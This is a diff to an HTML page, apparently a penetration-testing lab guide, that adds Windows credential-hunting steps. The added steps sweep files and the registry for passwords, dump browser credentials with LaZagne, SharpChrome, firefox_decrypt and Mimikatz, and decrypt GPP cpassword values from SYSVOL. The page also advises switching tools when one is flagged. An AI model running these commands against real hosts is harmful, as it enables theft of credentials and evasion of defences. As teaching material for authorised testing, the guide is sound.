@@ -77,24 +77,44 @@
               <li class="pc-node is-console" id="pcnode-cw-findstr">
                 <details class="pc-node-box">
                   <summary><span class="pc-node-label">findstr (pattern search)</span></summary>
-                  <div class="pc-node-body"><p>findstr searches many file types for a pattern. /S recurses, /I is case-insensitive, /M prints only the matching filenames. Point it at the common text and config extensions with a key term, and widen the terms and extensions as leads appear.</p><pre class="pc-cmd"><code>findstr /SIM /C:&quot;password&quot; *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
-findstr /SIM /C:&quot;pass&quot; *.xml *.config
-dir /s /b *pass* *cred* *.kdbx 2&gt;nul</code></pre></div>
+                  <div class="pc-node-body"><p>findstr searches many file types for a pattern. /S recurses, /I is case-insensitive, /M prints only the matching filenames. Point it at the common text and config extensions with a key term, and widen the terms and extensions as leads appear. findstr is line-based with no real regex, so when it is too blunt (or stripped), PowerShell does the same job better: Get-ChildItem -Recurse piped to Select-String greps file contents with a proper regex, and Get-ChildItem -Recurse -Include filters by interesting filename. Both are built in, so they work where you cannot drop a tool.</p><pre class="pc-cmd"><code>findstr /SIM /C:&quot;password&quot; *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
+dir /s /b *pass* *cred* *.kdbx 2&gt;nul
+powershell -c &quot;Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -EA SilentlyContinue | Select-String -Pattern &#39;password|pwd|secret&#39;&quot;
+powershell -c &quot;Get-ChildItem C:\Users -Recurse -Include *pass*,*cred*,*.kdbx -EA SilentlyContinue | Select Fullname&quot;</code></pre></div>
                 </details>
               </li>
               <li class="pc-node is-console" id="pcnode-cw-lazagne">
                 <details class="pc-node-box">
                   <summary><span class="pc-node-label">LaZagne (stored app creds)</span></summary>
-                  <div class="pc-node-body"><p>LaZagne extracts credentials that browsers and other applications store insecurely. It is modular, each module targets different software; start LaZagne.exe all runs every module, and -vv shows what it is doing. Browsers are the richest target: LaZagne supports 35 of them on Windows, and stored browser passwords, though encrypted, are decryptable with tools like firefox_decrypt and decrypt-chrome-passwords. Keep a standalone LaZagne.exe on the attack host and copy it over (xfreerdp pastes straight into the session). The modules are in the table below.</p><pre class="pc-cmd"><code>start LaZagne.exe all
+                  <div class="pc-node-body"><p>LaZagne extracts credentials that browsers and other applications store insecurely. It is modular, each module targets different software; start LaZagne.exe all runs every module, and -vv shows what it is doing. Browsers are the richest target: LaZagne supports 35 of them on Windows, and stored browser passwords, though encrypted, are decryptable. Keep a standalone LaZagne.exe on the attack host and copy it over (xfreerdp pastes straight into the session). If LaZagne is flagged or blocked, go per-application instead: the GhostPack tools SharpChrome and SharpDPAPI pull Chromium and DPAPI secrets; firefox_decrypt reads a copied Firefox profile offline; and Mimikatz reads them live (dpapi::chrome, sekurlsa::credman after privilege::debug). The modules are in the table below.</p><pre class="pc-cmd"><code>start LaZagne.exe all
 LaZagne.exe all -vv
-LaZagne.exe browsers</code></pre></div>
+SharpChrome.exe logins
+python3 firefox_decrypt.py profile.default-release</code></pre></div>
                 </details>
               </li>
-              <li class="pc-node" id="pcnode-cw-locations">
+              <li class="pc-node has-kids" id="pcnode-cw-locations">
                 <details class="pc-node-box">
                   <summary><span class="pc-node-label">Common stash locations</span></summary>
                   <div class="pc-node-body"><p>Beyond app stores, credentials turn up in predictable places. On a domain: Group Policy Preferences and scripts in the SYSVOL share, the AD user or computer description fields, and web.config on dev and IT shares. On any host: Unattend.xml / sysprep.inf (base64 or plaintext admin passwords), KeePass .kdbx databases (crack the master), and files named pass.txt, passwords.docx or passwords.xlsx on user systems, shares and SharePoint. IT shares outrank the company photo share, be strategic.</p></div>
                 </details>
+                <ul class="pc-tree">
+                <li class="pc-node is-console" id="pcnode-cw-gpp">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Group Policy Preferences (cpassword)</span></summary>
+                    <div class="pc-node-body"><p>A GPP that sets a local account password stores it AES-encrypted in a Groups.xml (or Services/ScheduledTasks/DataSources .xml) on SYSVOL, with a key Microsoft published, so anyone who can read SYSVOL can decrypt it offline. Grep SYSVOL for cpassword, or let a tool find and decrypt it: Get-GPPPassword (PowerSploit), NetExec&#39;s gpp_password / gpp_autologin modules, or gpp-decrypt on the captured string. Patched since MS14-025 (new GPP passwords are blocked) but old policies linger.</p><pre class="pc-cmd"><code>findstr /S /I cpassword \\DOMAIN\sysvol\DOMAIN\policies\*.xml
+Get-GPPPassword
+netexec smb 10.129.42.197 -u user -p pass -M gpp_password
+gpp-decrypt &#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-cw-reg">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Registry secrets &amp; autologon</span></summary>
+                    <div class="pc-node-body"><p>The registry caches credentials too. Winlogon&#39;s DefaultPassword holds an autologon password in clear; PuTTY sessions, OpenSSH, RealVNC/TightVNC and many installed apps keep secrets under HKCU or HKLM. reg query reads a known key, a wide reg query /f password /s sweeps for the word, and LaZagne&#39;s windows module automates the lot.</p><pre class="pc-cmd"><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultPassword
+reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; /s
+reg query HKLM /f password /t REG_SZ /s</code></pre></div>
+                  </details>
+                </li></ul>
               </li>
             </ul>
             <a class="pc-next" href="#pcphase-hunt-linux" data-to="hunt-linux"><span aria-hidden="true">&#8595;</span> Proceed to Hunt credentials: Linux</a>
